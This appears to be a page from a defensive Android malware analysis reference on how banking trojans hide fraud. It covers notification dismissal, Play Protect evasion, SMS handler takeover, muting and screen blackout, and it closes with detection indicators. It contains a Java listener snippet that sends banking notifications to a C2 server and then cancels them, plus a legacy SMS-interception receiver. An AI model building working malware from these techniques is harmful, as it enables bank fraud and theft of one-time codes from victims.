# Notification Suppression

Hiding, dismissing, or manipulating Android notifications to prevent victims from detecting ongoing fraud. When a banking trojan initiates an unauthorized transfer, the bank sends a transaction alert via SMS or push notification. If the victim sees that alert, the operation fails. Notification suppression ensures the victim remains unaware while the attacker drains their account.

See also: [Notification Listener Abuse](notification-listener-abuse.md), [SMS Interception](sms-interception.md), [Automated Transfer Systems](automated-transfer-systems.md)

!!! warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Primary | `BIND_NOTIFICATION_LISTENER_SERVICE` (user must enable in Settings) |
    | Alternative | `BIND_ACCESSIBILITY_SERVICE` (can dismiss notifications via UI interaction) |
    | SMS suppression | Default SMS handler role or `RECEIVE_SMS` with high-priority broadcast receiver |

## Notification Listener Suppression

### How It Works

`NotificationListenerService` provides full read and dismiss access to all notifications on the device. Once enabled, the malware's listener receives every notification posted by any app and can:

1. **Read content**: Extract OTP codes, transaction amounts, sender info
2. **Dismiss silently**: Call `cancelNotification()` to remove the notification before the user sees it
3. **Selective filtering**: Only suppress notifications from banking apps during fraud, leaving other notifications untouched to avoid suspicion

```java
@Override
public void onNotificationPosted(StatusBarNotification sbn) {
    String pkg = sbn.getPackageName();
    if (targetBankPackages.contains(pkg)) {
        String text = sbn.getNotification().extras
            .getString(Notification.EXTRA_TEXT);
        exfiltrateToC2(pkg, text);
        cancelNotification(sbn.getKey());
    }
}
```

### Dual Purpose: Theft + Suppression

The same `NotificationListenerService` that steals OTP codes also suppresses the transaction alert that follows. This is the standard pattern in modern banking trojans: intercept the 2FA code, suppress the confirmation notification, and the victim never knows a transaction occurred.

## Play Protect Suppression

Google Play Protect displays warnings when it detects potentially harmful apps. Malware suppresses these warnings to prevent the user from uninstalling it.

### Accessibility-Based Dismissal

The malware's accessibility service monitors for Play Protect warning dialogs and automatically dismisses them:

1. Detect `com.android.vending` (Play Store) window with warning text
2. Find and click "Ignore" or "Install anyway" button
3. If prompted with "Scan apps with Play Protect", navigate to disable it

Multiple families implement this as a standard module:

| Family | Technique | Source |
|--------|-----------|--------|
| [Anatsa](../malware/families/anatsa.md) | Accessibility clicks through Play Protect prompts | [Zscaler](https://www.zscaler.com/blogs/security-research/technical-analysis-anatsa-campaigns-android-banking-malware-active-google) |
| [Cerberus](../malware/families/cerberus.md) | Navigates to Play Protect settings, disables scanning | [Cyble](https://cyble.com/blog/hidden-in-plain-sight-errorfathers-deadly-deployment-of-cerberus/) |
| [Hook](../malware/families/hook.md) | Auto-dismisses Play Protect warnings | [Zimperium](https://zimperium.com/blog/hook-version-3-the-banking-trojan-with-the-most-advanced-capabilities) |
| [Xenomorph](../malware/families/xenomorph.md) | Intercepts Play Protect notification | [ThreatFabric](https://www.threatfabric.com/blogs) |

### Proactive Disabling

Rather than waiting for warnings, some families proactively disable Play Protect:

```
Settings > Security > Google Play Protect > ⚙️ > Disable "Scan apps with Play Protect"
```

The accessibility service navigates this flow automatically. See [Anti-Analysis Techniques](anti-analysis-techniques.md#av-and-security-app-detection) for the full implementation.

## SMS Notification Suppression

### Default SMS Handler

When malware becomes the default SMS handler (via user approval or accessibility auto-grant), it receives all incoming SMS messages directly. It can process messages silently without generating any notification:

1. Intercept incoming SMS
2. Extract OTP or transaction alert content
3. Suppress the notification entirely (never pass to the system notification handler)
4. Optionally restore default SMS handler afterward to avoid suspicion

[Cerberus](../malware/families/cerberus.md), [Anubis](../malware/families/anubis.md), and [FluBot](../malware/families/flubot.md) use this approach. See [Runtime Permission Manipulation](runtime-permission-manipulation.md#default-sms-app-exploitation) for the technical flow.

### Broadcast Priority (Legacy)

Before Android 4.4 (KitKat), any app could register an `SMS_RECEIVED` broadcast receiver with `android:priority="999"` and call `abortBroadcast()` to consume the SMS before the default handler saw it. The victim's messaging app never received the SMS.

```xml
<receiver android:name=".SmsInterceptor">
    <intent-filter android:priority="999">
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>
```

Android 4.4 fixed this by restricting SMS delivery to the default SMS app. Post-4.4 malware must either become the default handler or use accessibility/notification listener approaches.

## Push Notification Manipulation

### Fake Notification Injection

Beyond suppressing real notifications, malware generates fake notifications to drive the victim toward phishing pages:

1. Create a fake notification mimicking the bank app ("Suspicious transaction detected -- verify now")
2. Notification tap opens a WebView credential harvesting page controlled by the attacker
3. Simultaneously suppress real banking notifications that might contradict the fake alert

[Ginp](https://www.kaspersky.com/blog/ginp-mobile-banking-trojan/32478/) pioneered fake notification injection targeting Spanish banks. The trojan generated push notifications and SMS messages with any sender name and any text content, luring victims to open their banking app where Ginp's overlay would capture credentials.

### OTP Capture via Notification Reading

[Crocodilus](../malware/families/crocodilus.md) uses accessibility logging to [capture Google Authenticator OTP codes](https://www.threatfabric.com/blogs/exposing-crocodilus-new-device-takeover-malware-targeting-android-devices) directly from the screen. When the C2 sends the `TG32XAZADG` command, the malware enumerates all elements displayed in the Google Authenticator app, captures OTP names and values, and exfiltrates them. This beats app-based 2FA because the code is read after generation, not intercepted in transit.

## DND and Sound Manipulation

During active fraud operations (especially [ATS](automated-transfer-systems.md)), some families enable Do Not Disturb mode or mute the device to prevent any audible alerts:

- Set ringer mode to silent via `AudioManager.setRingerMode(RINGER_MODE_SILENT)`
- Enable DND via `NotificationManager.setInterruptionFilter(INTERRUPTION_FILTER_NONE)` (requires notification policy access)
- Reduce notification volume to zero

This is a supplementary technique used during the brief window of active fraud, not a persistent state that would alert the user.

## Screen Blackout During Fraud

Several families display a black overlay during remote access sessions to hide ATS activity:

| Family | Technique |
|--------|-----------|
| [Octo](../malware/families/octo.md) | Black screen overlay with "SHIT_QUALITY" reduced screenshot mode |
| [Hook](../malware/families/hook.md) | Screen dimmed to zero brightness + black overlay |
| [Crocodilus](../malware/families/crocodilus.md) | Black overlay on all activities during remote control |
| [BingoMod](../malware/families/bingomod.md) | Screen blackout during on-device fraud |

The victim sees a black screen (appearing as if the device is off or locked) while the attacker performs transfers in the background. All notifications during this period are invisible to the user.

## Families by Suppression Capability

| Family | Notification Listener | SMS Suppression | Play Protect | Fake Notifications | Screen Blackout |
|--------|:---------------------:|:---------------:|:------------:|:------------------:|:--------------:|
| [Cerberus](../malware/families/cerberus.md) | Yes | Default SMS | Yes | No | No |
| [Hook](../malware/families/hook.md) | Yes | Via accessibility | Yes | No | Yes |
| [Octo](../malware/families/octo.md) | Yes | Via accessibility | Yes | No | Yes |
| [Xenomorph](../malware/families/xenomorph.md) | Yes (`intercept_notification`) | Via accessibility | Yes | No | No |
| [Anatsa](../malware/families/anatsa.md) | Yes | No (ATS-focused) | Yes | No | No |
| [GodFather](../malware/families/godfather.md) | Yes | No | Yes | Yes | No |
| [TrickMo](../malware/families/trickmo.md) | Yes | No | Yes | Yes | No |
| [Crocodilus](../malware/families/crocodilus.md) | Yes | No | Yes | No | Yes |
| [Anubis](../malware/families/anubis.md) | Yes | Default SMS | No | No | No |
| [FluBot](../malware/families/flubot.md) | No | Default SMS | No | No | No |

## Android Version Timeline

| Version | Change | Impact |
|---------|--------|--------|
| 4.3 | `NotificationListenerService` introduced | First programmatic notification access |
| 4.4 | Default SMS handler required for SMS access | `abortBroadcast()` trick eliminated |
| 5.0 | Notification access requires explicit user toggle in Settings | Social engineering required to enable |
| 8.0 | Notification channels introduced | Apps can create low-importance channels to hide their own notifications |
| 13 | `POST_NOTIFICATIONS` requires runtime permission | Malware must request or auto-grant via accessibility |
| 13 | Restricted Settings blocks sideloaded apps from notification listener | [Session-based installer bypass](runtime-permission-manipulation.md#session-based-installer-bypass-android-13) circumvents this |
| 14 | Restricted Settings expanded | Session-based bypass persists |

## Detection During Analysis

??? example "Static Indicators"

    - `BIND_NOTIFICATION_LISTENER_SERVICE` in manifest
    - `cancelNotification()` or `cancelAllNotifications()` calls in notification listener
    - `Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT` intent for SMS handler takeover
    - `AudioManager.setRingerMode()` calls without user-facing audio controls
    - `NotificationManager.setInterruptionFilter()` for DND manipulation
    - Package name lists for banking apps in notification filtering logic

??? example "Dynamic Indicators"

    - Banking notifications appearing and immediately disappearing
    - SMS messages received but no notification shown
    - Play Protect warnings auto-dismissed within seconds
    - Device entering silent/DND mode during banking app activity
    - Black screen overlay while device is actively communicating with C2
